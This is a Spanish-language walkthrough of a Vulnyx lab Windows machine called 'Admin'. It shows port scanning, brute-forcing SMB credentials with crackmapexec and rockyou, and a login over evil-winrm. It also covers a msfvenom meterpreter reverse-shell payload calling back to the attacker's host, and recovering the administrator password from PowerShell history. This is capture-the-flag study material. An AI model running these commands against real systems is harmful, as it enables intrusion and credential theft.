@@ -1,0 +1,84 @@
+PORT      STATE SERVICE
+80/tcp    open  http
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+5985/tcp open  winrm
+
+
+-En el puerto 80 hay un servidor IIS
+
+-Intentamos enumerar SMB pero no tenemos permisos
+
+-Hacemos fuzzing al puerto 80 y encontramos la siguiente ruta:
+	-tasks.txt (Encontramos un usuario llamado 'hope')
+
+-Fuerza Bruta al usuario 'hope' con crackmapexec:
+	-crackmapexec smb 192.168.1.138 -u hope -p /usr/share/wordlists/rockyou
+		-passwod: loser
+
+-Intentamos autenticarnos por SMB con las credenciales obtenidas:
+	-Intentamos con psexec y entrar en algún recurso compartido pero no tenemos los permisos suficientes
+
+-Recordamos que tenemos el **puerto 5985**, en el que suele estar el servicio **winrm**
+
+-Para comprobar que el servicio winrm está activo:
+	-crackmapexec winrm 192.168.1.138
+		SMB         192.168.1.138   5985   ADMIN            [*] Windows 10 / Server 2019 Build 19041 (name:ADMIN) (domain:ADMIN)
+		HTTP        192.168.1.138   5985   ADMIN            [*] http://192.168.1.138:5985/wsman
+		(Esto nos confirma que winrm está activo en el puerto 5985)
+
+-Nos intentamos conectar con **'evil-winrm'** con las credenciales obtenidas:
+	-evil-winrm -i 192.168.1.138 -u hope -p loser
+		*Evil-WinRM* PS C:\ 
+		HA FUNCIONADO!!
+
+## Escalada de Privilegios
+
+-He intentado subir un **archivo .exe** generado con msfvenom a la máquina víctima con **certutil**. Sin embargo, cuando utilizamos **evil-winrm** e intentamos subir archivos .exe con certutil, el **antivirus de Windows** es probable que **no nos deje**.
+
+-Tenemos que subir los archivos con el siguiente comando, que viene con evil-winrm:
+	-upload
+
+-He conseguido una sesión de meterpreter de la siguiente manera:
+	1-Genero el Payload con msfvenom:
+		-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.135 LPORT=4444 -f exe -o meterpreter.exe 
+		-NOTA: Aunque la máquina sea de x64, en windows no se especifica en msfvenom.
+	2-Me pongo en escucha en el multi/handler de Metasploit
+	3-Descargo el .exe en la máquina víctima y lo ejecuto:
+		-Descargamos el Payload en la máquina víctima (en C:\temp):
+			-upload /home/kali/Vulnyx/Windows/Easy/Admin/exploits/meterpreter.exe
+		-Ejecutamos el archivo .exe para obtener la conexión:
+			-./meterpreter.exe
+				meterpreter > getuid
+				ADMIN\hope
+
+-Aun teniendo una sesión de meterpreter, no he sido capaz de Escalar Privilegios, he intentado:
+	1-Comando getsystem (meterpreter)
+	2-Módulo --> post/multi/recon/local_exploit_suggester
+	(NINGUNO de los 2 ha funcionado)
+
+-Probamos con Winpeas.exe:
+	-Descargamos el Winpeas.exe en la máquina víctima para que analice todo el sistema:
+		-upload /Downloads/
+	-Ejecutamos Winpeas.exe:
+		-./winPEASx64.exe
+
+**NOTA:** En evil-winrm los archivos .exe se ejecutan de la siguiente manera:
+	-./winPEASx64.exe
+	-Sin embargo, en una shell normal de Windows, se ejecutan de esta otra:
+		-.\winPEASx64.exe
+
+-Ha encontrado el siguiente archivo:
+
+C:\Users\hope\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+-Vemos su contenido:
+	-type C:\Users\hope\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\
+	ConsoleHost_history.txt
+		- [ ] Set-LocalUser -Name "administrator" -Password (ConvertTo-SecureString "SuperAdministrator123" -AsPlainText -Force)
+
+-Hemos encontrado las credenciales del usuario administrador, nos autenticamos:
+	-evil-winrm -i 192.168.1.138 -u administrator -p SuperAdministrator123
+		-*Evil-WinRM* PS C:\Users\administrator\Documents> 
+		Ya somos root!!
